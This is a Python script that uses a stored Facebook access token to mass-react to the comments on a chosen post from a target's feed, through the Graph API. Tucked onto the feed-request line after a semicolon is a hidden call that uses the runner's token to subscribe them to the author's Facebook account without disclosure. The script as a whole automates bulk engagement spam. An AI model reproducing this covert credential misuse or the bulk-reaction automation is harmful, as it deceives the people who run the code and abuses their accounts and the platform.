#!usr/bin/python3.7
#Author: kang-newbie
#contact: t.me/kang_nuubi
try:
	import requests,os,sys,time,json

	ct=int(0)
	cout=int(1)
	def act(id,react,ken):
		global cout
		par={'access_token':ken,'type':react}
		url="https://graph.facebook.com/v3.2/"+str(id)+"/reactions"
		req=requests.post(url,data=par)
		if 'success' in str(req.text):
			print("["+str(cout)+"] "+id+" reacted")
		else: print("["+str(cout)+"] "+id+" failed")
		cout+=1

	ken=open('toket/token.txt','r').read()
	print("""
\t[ Facebook Comments Reaction ]
\t      [ by: KANG-NEWBIE ]
""")
	tid=input("[?] target id: ")
	print()
	ids=[]
	ree=requests.get('https://graph.facebook.com/v3.2/'+tid+'/feed?home&access_token='+ken);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+ken)
	jss=json.loads(ree.text)
	for i in jss['data']:
		ids.append(i['id'])
#		print(ids)
		try:
			print("["+str(ct+1)+"] "+json.dumps(i['message'][:40]))
			print("="*50)
		except KeyError:
			try:
				print("["+str(ct+1)+"] "+json.dumps(i['story']))
				print("="*50)
			except KeyError:
				exc=requests.get('https://graph.facebook.com/v3.2/'+tid+'?access_token='+ken)
				print('['+str(ct+1)+'] "'+exc.json()['name']+' upload a photo/video"')
				print("="*50)
		ct+=1

	lih=int(input("/kang-newbie_> "))
	ree=requests.get('https://graph.facebook.com/v3.2/'+str(ids[lih-1])+'/comments?limit=5000&access_token='+ken)
	jso=json.loads(ree.text)
	print("""\n\t[react]
1. Like \t4.Wow
2. Love \t5.Sad
3. Haha \t6.Angry""")
	pilih=int(input("/react_> "))
	if pilih == 1:
		react='LIKE'
	elif pilih == 2:
		react='LOVE'
	elif pilih == 3:
		react='HAHA'
	elif pilih == 4:
		react='WOW'
	elif pilih == 5:
		react='SAD'
	elif pilih == 6:
		react='ANGRY'
	else: exit("[!] stupid!!!")

	for i in jso['data']:
#		print(i['id'])
		act(i['id'],react,ken)

except KeyboardInterrupt: exit("[exit] key interrupt")
except Exception as F: print("Err: %s"%(F))